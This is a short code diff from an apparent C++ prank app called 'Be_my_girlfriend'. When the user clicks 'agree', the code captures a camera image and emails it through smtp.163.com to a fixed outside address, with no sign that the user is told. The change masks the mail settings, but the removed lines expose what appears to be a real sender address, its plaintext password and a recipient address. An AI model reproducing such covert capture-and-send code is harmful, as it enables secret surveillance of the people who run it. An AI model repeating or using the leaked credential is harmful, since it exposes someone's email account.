@@ -119,12 +119,12 @@ void Be_my_girlfriend::agree_click()
 			camera_image_capture->capture();
 			CSmtp smtp(
 				25,								/*smtp端口*/
-				"smtp.163.com",					/*smtp服务器地址*/
-				"qq3534679530@163.com",	/*你的邮箱地址*/
-				"acute166131",					/*邮箱密码*/
-				"3534679530@qq.com",	/*目的邮箱地址*/
-				"zp",							/*主题*/
-				"zpzp"		/*邮件正文*/
+				"smtp.163.com",							/*smtp服务器地址*/
+				"*****@163.com",						/*你的邮箱地址*/
+				"****",								/*邮箱密码 需要先开通smtp服务*/
+				"******@qq.com",						/*目的邮箱地址*/
+				"zp",								/*主题*/
+				"zpzp"								/*邮件正文*/
 			);
 			
 			//添加附件时注意,\一定要写成\\，因为转义字符的缘故
